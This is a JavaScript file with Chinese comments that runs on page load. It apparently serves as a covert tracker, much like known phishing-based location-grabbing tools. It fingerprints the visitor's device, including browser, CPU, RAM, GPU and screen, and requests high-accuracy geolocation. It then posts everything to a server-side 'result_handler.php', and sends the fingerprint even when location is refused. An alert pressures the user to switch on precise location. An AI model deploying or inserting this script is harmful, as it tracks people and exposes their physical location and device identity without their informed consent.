function getDeviceInfo() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var os = ver;
  var ht = window.screen.height;
  var wd = window.screen.width;

  var canvas = document.createElement('canvas');
  var gl, debugInfo, ven, ren;

  // 浏览器检测
  var brw = 'Not Available';
  if (ver.indexOf('Firefox') !== -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') !== -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') !== -1) brw = 'Safari';
  else if (ver.indexOf('Edge') !== -1) brw = 'Edge';
  else if (ver.indexOf('MicroMessenger') !== -1) brw = 'WeChat';

  // GPU 信息
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Not Available';
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Not Available';
  } catch (e) {
    ven = ren = 'Not Available';
  }

  // 操作系统
  os = os.substring(0, os.indexOf(')')).split(';')[1]?.trim() || 'Not Available';

  return {
    Ptf: ptf,
    Brw: brw,
    Cc: cc,
    Ram: ram,
    Ven: ven,
    Ren: ren,
    Ht: ht,
    Wd: wd,
    Os: os,
  };
}

function getLocation(callback, errCallback) {
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 30000, maximumage: 0 };
    navigator.geolocation.getCurrentPosition(
      position => {
        callback({
          Lat: position.coords.latitude - 0.002906 || 'Not Available',
          Lon: position.coords.longitude + 0.004939|| 'Not Available',
          Acc: position.coords.accuracy + ' m' || 'Not Available',
          Alt: position.coords.altitude + ' m' || 'Not Available',
          Dir: position.coords.heading + ' deg' || 'Not Available',
          Spd: position.coords.speed + ' m/s' || 'Not Available',
          Status: 'success',
        });
      },
      error => {
        let err_text;
        switch (error.code) {
          case error.PERMISSION_DENIED:
            err_text = 'User denied the request for Geolocation';
            break;
          case error.POSITION_UNAVAILABLE:
            err_text = 'Location information is unavailable';
            break;
          case error.TIMEOUT:
            err_text = 'The request to get user location timed out';
            alert('Please set your location mode on high accuracy...');
            break;
          default:
            err_text = 'An unknown error occurred';
        }
        errCallback({
          Status: 'failed',
          Error: err_text,
        });
      },
      optn
    );
  } else {
    errCallback({ Status: 'failed', Error: 'Geolocation not supported' });
  }
}

function sendCombinedData() {
  const deviceInfo = getDeviceInfo();

  getLocation(
    locationInfo => {
      const combinedData = { ...deviceInfo, ...locationInfo };

      // 数据发送
      $.ajax({
        type: 'POST',
        url: 'result_handler.php',
        data: combinedData,
        success: function (response) {
          console.log('Data successfully sent:', response);
        },
        mimeType: 'text',
      });
    },
    errorInfo => {
      const combinedData = { ...getDeviceInfo(), ...errorInfo };

      // 数据发送
      $.ajax({
        type: 'POST',
        url: 'result_handler.php',
        data: combinedData,
        success: function (response) {
          console.log('Error data sent:', response);
        },
        mimeType: 'text',
      });
    }
  );
}

// 调用函数
sendCombinedData();
